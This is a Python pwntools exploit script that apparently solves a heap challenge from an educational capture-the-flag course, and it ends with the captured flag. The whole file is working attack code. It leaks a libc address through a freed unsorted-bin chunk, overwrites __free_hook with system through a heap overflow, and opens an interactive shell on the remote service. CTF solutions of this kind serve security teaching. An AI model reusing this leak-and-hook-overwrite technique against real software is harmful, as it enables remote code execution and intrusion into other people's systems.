from pwn import *

r = remote('edu-ctf.zoolab.org', 10008)
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

main_arena_offset = 0x1ecbe0
system_offset = 0x52290
free_hook_offset = 0x1eee48

def add(idx, name, password):
    global r
    r.sendlineafter('bye\n> ', b'1')
    r.sendlineafter("index\n> ", str(idx))
    r.sendlineafter("username\n> ", name)
    r.sendlineafter("password\n> ", password)
    r.recvuntil("success!\n")

def edit(idx, size, data):
    global r
    r.sendlineafter('bye\n> ', b'2')
    r.sendlineafter("index\n> ", str(idx))
    r.sendlineafter("size\n> ", str(size))
    r.sendline(data)
    r.recvuntil("success!\n")
    # print(f"Edited {idx}")

def delete(idx):
    global r
    r.sendlineafter('bye\n> ', b'3')
    r.sendlineafter("index\n> ", str(idx).encode())
    r.recvuntil("success!\n")
    # print(f"Deleted {idx}")

def show():
    global r
    r.sendlineafter('bye\n> ', b'4')
    all_notes = r.recvuntil("1. add_user\n")
    return all_notes

add(1, b'A'*8, b'A'*8)
edit(1, 0x418, b'A')

add(2, b'B'*8, b'B'*8)
edit(2, 0x18, b'B')

add(3, b'C'*8, b'C'*8)

delete(1)
stored = show()
print(stored)
main_arena = u64(stored.split(b'\n')[1][-6:].ljust(8, b'\x00'))

libc = main_arena - main_arena_offset
free_hook = libc + free_hook_offset
system = libc + system_offset

print(f"libc: {hex(libc)}")
print(f"free_hook: {hex(free_hook)}")
print(f"system: {hex(system)}")

garbage = b'A'*8
fake = flat(
    b'/bin/sh\x00', garbage,
    garbage, 0x31,
    garbage, garbage,
    garbage, garbage,
    free_hook
)
system = flat(system)

edit(2, 0x48, fake)
edit(3, 0x8, system)
r.interactive()
# delete index 2 --> __free_hook(2->data) --> system('/bin/sh\x00')
# FLAG{crocodile_9d7d8f69be2c2ab84721384d5bda877f}